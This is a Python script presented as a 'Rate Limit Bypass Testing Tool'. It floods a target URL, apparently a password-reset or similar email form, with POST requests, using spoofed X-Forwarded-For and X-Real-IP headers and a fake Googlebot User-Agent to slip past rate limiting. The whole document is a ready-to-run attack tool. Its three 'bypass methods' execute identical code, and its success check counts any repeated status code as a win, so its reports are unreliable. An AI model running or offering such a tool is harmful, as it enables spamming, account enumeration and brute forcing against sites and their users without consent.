import requests
import random
import time
import argparse
from collections import defaultdict

# Define common headers for bypass
HEADERS_LIST = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "192.168.1.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
    {"User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)"},
]

# Function to test rate limits
def test_rate_limit(target_url, email):
    print(f"\n[+] Testing Rate Limit on: {target_url}")
    
    results = defaultdict(int)
    initial_responses = []
    
    for i in range(10):  # Send 10 requests to detect limits
        headers = random.choice(HEADERS_LIST)
        payload = {"email": email}  # Modify based on target form data
        
        response = requests.post(target_url, data=payload, headers=headers)
        results[response.status_code] += 1
        initial_responses.append(response.status_code)
        
        print(f"[-] Attempt {i+1}: Status {response.status_code} | Headers: {headers}")

        time.sleep(random.uniform(0.5, 1.5))  # Add slight delay

    # Detect rate limiting
    if len(set(initial_responses)) > 1:
        print("\n[!] Possible Rate Limit Detected!")
    else:
        print("\n[+] No Rate Limit Found.")

    # Try bypassing if rate limit is detected
    bypass_methods = {
        "Header Spoofing": False,
        "IP Rotation (Manual)": False, 
        "Delay Variation": False
    }
    
    for method, status in bypass_methods.items():
        print(f"\n[*] Testing {method}...")
        for i in range(5):
            headers = random.choice(HEADERS_LIST)
            response = requests.post(target_url, data=payload, headers=headers)
            
            if response.status_code in initial_responses:
                bypass_methods[method] = True
                print(f"[✔] {method} Successful!")
                break
            else:
                print(f"[✖] {method} Failed on attempt {i+1}")
            
            time.sleep(random.uniform(1, 3))  # Adjust delay
    
    # Generate report
    print("\n[+] Rate Limit Bypass Report:")
    for method, status in bypass_methods.items():
        print(f"   - {method}: {'✅ Success' if status else '❌ Failed'}")

    print("\n[+] Testing Completed.")

# Argument parsing
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Rate Limit Bypass Testing Tool")
    parser.add_argument("--target", required=True, help="Target URL for the rate limit test")
    args = parser.parse_args()

    email = input("[?] Enter registered email: ")
    test_rate_limit(args.target, email)
